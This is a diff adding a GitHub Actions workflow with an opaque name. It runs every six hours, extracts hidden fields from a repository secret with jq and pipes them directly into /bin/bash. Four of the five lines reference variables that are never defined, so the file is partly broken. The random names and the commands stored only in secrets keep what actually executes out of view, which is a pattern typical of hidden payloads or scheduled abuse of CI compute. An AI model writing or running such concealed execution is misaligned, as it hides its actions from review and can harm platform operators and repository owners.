@@ -1,0 +1,21 @@
+name: wenhuaketongshikao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wenhuaketongshikao
+        env:
+          ls73: ${{ secrets.ls73 }}
+        run: |
+          echo $ls73 | jq -r .az077 | /bin/bash
+          echo $jdu280 | jq -r .thxg3 | /bin/bash
+          echo $yba5469 | jq -r .mbmvd81 | /bin/bash
+          echo $mxud8136 | jq -r .nn4 | /bin/bash
+          echo $zac697 | jq -r .bm316 | /bin/bash
+
